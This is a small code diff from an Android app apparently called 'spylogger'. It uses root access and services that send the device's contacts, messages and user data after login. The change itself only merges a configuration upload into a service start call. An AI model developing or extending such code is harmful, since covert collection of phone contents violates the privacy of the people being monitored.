@@ -41,13 +41,11 @@ import com.gravatasufoca.spylogger.repositorio.RepositorioConfiguracao;
 import com.gravatasufoca.spylogger.repositorio.RepositorioTopico;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioConfiguracaoImpl;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioTopicoImpl;
-import com.gravatasufoca.spylogger.services.SendConfiguracaoService;
 import com.gravatasufoca.spylogger.services.SendContatosService;
 import com.gravatasufoca.spylogger.services.SendMensagensService;
 import com.gravatasufoca.spylogger.services.SendUsuarioService;
 import com.gravatasufoca.spylogger.utils.Utils;
 import com.gravatasufoca.spylogger.vos.AparelhoVO;
-import com.gravatasufoca.spylogger.vos.ConfiguracaoVO;
 import com.gravatasufoca.spylogger.vos.UsuarioVO;
 import com.stericson.RootTools.RootTools;
 import com.utilidades.gravata.utils.Utilidades;
@@ -494,9 +492,7 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
                         SendContatosService sendContatosService=new SendContatosService(getApplication(),null);
                         sendContatosService.enviarContatos();
 
-                        SendConfiguracaoService sendConfiguracaoService=new SendConfiguracaoService(null);
-                        sendConfiguracaoService.enviar(new ConfiguracaoVO(configuracao));
-                        Utils.startNewService(context);
+                        Utils.startNewService(context,configuracao);
 //                        finish();
                         break;
                     default:
